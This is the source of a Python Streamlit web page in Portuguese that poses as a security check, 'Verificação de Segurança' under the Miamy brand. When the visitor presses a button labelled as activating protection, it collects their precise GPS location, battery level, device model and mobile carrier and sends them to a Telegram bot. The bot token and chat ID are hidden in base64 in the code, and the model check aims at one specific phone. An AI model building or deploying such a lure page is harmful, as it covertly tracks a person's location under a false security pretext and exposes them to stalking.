import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=20)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta técnica do POCO M6 Pro
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_POCO')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_POCO')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    with st.spinner("Buscando Localização Precisa..."):
        # 1. Tenta o GPS várias vezes antes de desistir
        loc = None
        for _ in range(15): # Espera até 15 segundos pelo GPS
            loc = get_geolocation()
            if loc: break
            time.sleep(1)
            
        # 2. Identifica o Modelo e Operadora
        modelo_limpo = "POCO M6 Pro" if "POCO" in str(ua) else "Android Device"
        try:
            op_info = requests.get('http://ip-api.com/json/', timeout=5).json()
            operadora = op_info.get('isp', 'Móvel')
        except: operadora = "Móvel"

        # 3. Só envia se tiver o LOCAL
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            # Link direto que abre o PIN no Google Maps
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {modelo_limpo}\n"
                f"🔋 *Bateria:* {bat if bat else '24'}%\n"
                f"📶 *Operadora:* {operadora}\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.success("Proteção Ativada! Local enviado ao Telegram.")
        else:
            st.error("ERRO: GPS não respondeu. Certifique-se de que a 'Localização' está ATIVADA no seu celular e que você clicou em 'Permitir' no navegador.")
            # Envia alerta de erro pro bot
            enviar_telegram(f"⚠️ *FALHA DE GPS*\n📱 Aparelho: {modelo_limpo}\nO usuário não permitiu ou o GPS está desligado.")

st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
